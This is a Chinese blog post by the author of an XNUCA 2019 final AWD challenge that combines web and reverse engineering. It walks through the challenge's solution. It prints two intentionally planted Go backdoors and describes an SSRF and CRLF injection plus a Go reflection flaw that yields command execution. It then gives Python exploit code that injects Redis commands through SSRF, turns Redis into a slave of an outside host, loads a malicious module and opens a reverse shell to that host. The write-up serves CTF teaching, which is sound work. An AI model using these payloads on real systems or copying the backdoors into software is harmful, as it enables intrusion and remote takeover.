---
title: XNUCA决赛awd1题解
url: 773.html
id: 773
categories:
  - hack_ctf
date: 2020-1-12 09:50:26
tags:
  - ctf
  - web
  - reverse
---


## 0x1 前言

我的拖延症真是没得救了,拖了这么久才写题解 ......

题目环境以及源码上传在[https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Final/awd1_with_exp](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Final/awd1_with_exp)


当被告知要出一个 reverse + web 的题目的时候，我的内心十分的拒绝，因为对逆向我实在是太差了，没有相关的经验，而事实证明我题目出的也是很烂，导致比赛一开始就被打开花了。

<!-- more -->

虽然出的比较烂，但是还是有朋友希望我能把题目源码和环境发出来，毕竟国内的线下awd比赛中web和二进制相结合的也不是太多。

这篇文章就讲一下漏洞以及利用过程。


## 0x2 题目漏洞简介

因为是awd题目，所以不得不加了两个后门，就不再详细说了。只贴一下源码吧。

第一个后门：

```go
func info( c *Context) error {
	userAgent := c.Request().Header.Get("User-Agent")

	info := "hello world"
	if strings.EqualFold(userAgent,"Mozilla/5.0 (Macintosh; wdeYKQtOhc6L8TsIm1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36"){
		fileName := c.QueryParam("file")

		if contents,err := ioutil.ReadFile(fileName) ; err == nil {
			return c.String(http.StatusOK,fmt.Sprintf("%s,🤣🤣:%s",info,contents))
		}
	}

	return c.String(http.StatusOK,fmt.Sprintf("%s,🤣🤣",info))
}
```

第二个后门:

```go
func admin( c *Context ) error {
	fmt.Println(c.Request().RemoteAddr)
	ipstr ,_,_ := net.SplitHostPort(c.Request().RemoteAddr)

	ip := net.ParseIP(ipstr)

	fmt.Println(ip)
	localip := net.ParseIP("127.0.0.1")
	if !ip.Equal(localip) {
		return echo.NewHTTPError(http.StatusForbidden)
	}

	info := Adminnote{ getVersion(),getWho(),"cat /proc/meminfo"}

	if contents,err := ioutil.ReadFile("/flag") ; err == nil {

		// return c.String(http.StatusOK,fmt.Sprintf("%s,🤣🤣:%s",info,contents))
		userAgent := c.Request().Header.Get("Identify-Client")
		if userAgent == "" {
			userAgent = randString(32)
		}else{
			userAgent = md5String(userAgent)
		}
		ioutil.WriteFile("./assets/"+userAgent,[]byte(contents),0400)

	}
	return c.String(http.StatusOK,fmt.Sprintf("%s,🤣🤣",info))
}
```

下面详细说一下本题目中真正存在的漏洞。

### SSRF漏洞和CRLF漏洞

SSRF漏洞不用说了，没有任何过滤，可以直接打。

CRLF漏洞是go语言的库 net/http 的问题，参考如下 issue [https://github.com/golang/go/issues/30794](https://github.com/golang/go/issues/30794)。


1. 利用CRLF漏洞一方面可以绕过 `e.POST("/admin",handler(admin))` 中对ip的检查，调用这个后门获取flag。

2. 另一方面可以利用CRLF漏洞和SSRF漏洞可以用来打redis。

### go语言的反序列化+类型反射

不得不承认go语言是非常安全的，为了写出点漏洞，我也是拼了.... 我太难了。

go语言的反序列化过程是可以保证安全的，但是这却给写代码很多不便，因为很多时候我们的确需要一些动态的特性，比如根据不同的序列化数据在反序列化的时候产生不同的对象来方便使用，这个时候只能使用反射来帮忙。


代码中根据 note 的不同，初始化出不同的对象。

```go

func index(c *Context) error {
	s := c.Session()
	notes := s.Get("notes")

	if(notes == nil ){

		return  c.String(http.StatusOK,"Here is no note for you .")
	}
	tmp := notes.([]interface{})

	var buf bytes.Buffer

	for k,v := range tmp {

		fmt.Println(k,v)
		note := v.(map[string]interface{})
		fmt.Println(note["Type"])
		noteReal , _ := newStruct( note["Type"].(string) )
		
		// noteNew.Title = "ddddddddd"
		// fmt.Println( reflect.TypeOf(noteReal) )

		switch  t :=noteReal.(type) {

			case Textnote:
				// newNote := noteReal.(Text)
				value := reflect.ValueOf(&t).Elem()
				typeOfT := value.Type()

				for k,v := range note["Data"].(map[string]interface{}){
                    ... 
                    
				}
				buf.WriteString(fmt.Sprintf("%s</br>",t))
			
			case Urlnote:
				// newNote := noteReal.(Text)
				value := reflect.ValueOf(&t).Elem()
				typeOfT := value.Type()

				for k,v := range note["Data"].(map[string]interface{}){

					// fmt.Println(k,"textnote")

                    // value.FieldByName( strings.Title(k) ).Set(reflect.ValueOf(v.(string)))
                    ...
				}
				buf.WriteString(fmt.Sprintf("%s</br>",t))
			
			case Adminnote:
				// newNote := noteReal.(Text)
				fmt.Println("this is adminnote")
				value := reflect.ValueOf(&t).Elem()
				typeOfT := value.Type()

				for k,v := range note["Data"].(map[string]interface{}){

					// fmt.Println(k,"textnote")

					// value.FieldByName( strings.Title(k) ).Set(reflect.ValueOf(v.(string)))

					count := value.NumField()
					for i := 0; i < count; i++ {
						f := value.Field(i)
						name := typeOfT.Field(i).Name
						if strings.ToLower(name) == k {

							switch f.Kind() {
								case reflect.String:
									// fmt.Println( strings.Title(k), "string")
									value.FieldByName( strings.Title(k) ).Set(reflect.ValueOf(v.(string)))
								case reflect.Int:
									// fmt.Println( strings.Title(k), "int" )
									value.FieldByName( strings.Title(k) ).Set(reflect.ValueOf( int(v.(float64)) ))
							}
						}
					}
				}
				buf.WriteString(fmt.Sprintf("%s</br>",t))
		}

	}

	return c.String(http.StatusOK,buf.String())
}

```

利用这个反射可以直接初始化出来 `Adminnote`, 然后看到最后的 `buf.WriteString(fmt.Sprintf("%s</br>",t))`,可以直接调用 `Adminnote` 的 `String`函数，这点倒是和大多数的高级语言比较相似。

```go
func (c Adminnote)String() string{
	var buf bytes.Buffer
	
	buf.WriteString("System Version: \n")
	buf.WriteString(c.Version + "\n")

	buf.WriteString("Login user : \n")
	buf.WriteString(c.Who + "\n")

	
	getMemory :=  strings.Split(c.Memory," ")

	buf.WriteString("Memory Status: \n")
	cmd := exec.Command(getMemory[0],getMemory[1])

	stdout, err := cmd.StdoutPipe()
    if err != nil {
		// memoryStats := 
		buf.WriteString(err.Error())
		return buf.String()
	}
	defer stdout.Close()
    // 运行命令
    if err := cmd.Start(); err != nil {
		buf.WriteString(err.Error())
		return buf.String()
	}
	
	opBytes, err := ioutil.ReadAll(stdout)
    if err != nil {
		buf.WriteString(err.Error())
		return buf.String()
	}

    // buf.
    
	buf.WriteString(string(opBytes))
	return buf.String()

}

```

如果可以完全控制 `Adminnote` 的内容，就可以利用 `getMemory` 这个点实现任意命令执行。


## 0x3 非预期解

我没有仔细看 sid 和 redis中的key值的对应关系，导致了可以根据 sid 直接获取到redis中的key值，进而使用ssrf直接控制redis中对应的key值为对应的内容，实现rce。

```python
name = 'session_'+s0.cookies['sid'].replace('-','+').replace('_','/').decode('base64').split('|')[1].decode('base64')[4:]
val = "{\"notes\":[{\"Type\":\"adminnote\",\"Data\":{\"title\":\"aaa\",\"memory\":\"cat /flag\",\"who\":\"dotsu\",\"version\":\"1234\"}}]}"
data = {
'title':'test1',
'url':'http://redis:6379?\r\nauth redis123456aB\r\nSET %s \'%s\'\r\n'%(name, val)
}
r = s1.post(timeout=4,url=note_now_url,data=data)
```

哎，这样太简单了，直接导致某些队伍直接爆打全场，贼大的失误。。。

## 0x4 预期解法

我预期的解法是不知道redis中的key的情况下修改redis中的数据，控制go服务实现任意命令执行，下面详细说一下预期解法的实现步骤

**预期解法：**

1. 使用redis的slave模式，让其加载恶意的so模块，实现 redis 的 rce，反弹 shell 。
2. 然后利用 redis 反弹的 shell，读取 redis 中的 key 值
3. 修改key值对应的 value，实现 go web 服务的 rce。

但是获取 redis 的 shell 过程有两个问题需要解决：

1. redis成为 slave 模式之后，就会清空自己的数据，并变成不可写。因为redis变成不可写，导致无法插入新的urlnote，无法发起新的SSRF攻击。

2. redis 成为 slave 模式之后，隔一段时间才会去下载 master 的数据。 因为有一段时间间隔，导致我们没办法使用一个 SSRF payload 让 redis 成为 slave 模式的同时，还可以加载 so 库 ，并实现任意代码执行。

**如果你找到了仅使用一个 SSRF payload 就拿到 redis 的 shell 的办法，请一定要带带我**

为了解决这个问题，就需要发送两个请求，第一个请求让 redis 成为 slave 模式，第二个请求让redis加载第三方模块，进行命令执行，同时恢复正常模式。

但是这两个请求之间要有一个较长的时间延迟，让redis有足够的时间去同步master的数据。所以这里最好的做法是在两个请求之间再插入一个请求，让这个请求连接一个不存在的地址，等待TCP超时之后，再发起第三个请求。

最后的exp如下：

```python

def exp3(host):
    '''
       /urlnote  
       ssrf connect redis to getshell 
    '''

    url = "http://{}/urlnote".format(host)

    session = requests.Session()

    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # send payload 1 ， set redis to slave 
    payload = "title=payload1&url=http://172.16.0.3:6379/?a=1%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$12%0d%0awonderkun.cc%0d%0a$5%0d%0a21000%0d%0a"

    res = session.post(url,data=payload,headers=header)

    if res.status_code != 200 :
        print("[*] ssrf connect redis error!")
        return 

    # send payload 2 , set timeout 
    payload = "title=payload2&url=http://192.168.0.100:7777/?a=test" # add a host ，without route to it

    res = session.post(url,data=payload,headers=header)

    if res.status_code != 200 :
        print("[*] ssrf connect redis error!")
        return 

    # send paylaod 3, let redis reverse shell to wonderkun.cc:7777 

    payload = "title=payload3&url=http://172.16.0.3:6379/?a=1%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a*2%0d%0a$11%0d%0asystem.exec%0d%0a$2%0d%0als%0d%0a"

    res = session.post(url,data=payload,headers=header)

    if res.status_code != 200 :
        print("[*] ssrf connect redis error!")
        return 
    
    url = "http://{}/".format(host)

    res = session.get(url)

    # nc -l -p 7777 , return shell to wonderkun.cc:7777 
    # set adminnote to RCE go server. 
    '''
    run 
    > redis-cli 
       > auth key
       > set key '{"notes":[{"Type":"adminnote","Data":{"version":"172.18.2:6379","who":"wonderkun","memory":"cat /flag"}}]}'

    visit /
    '''
```

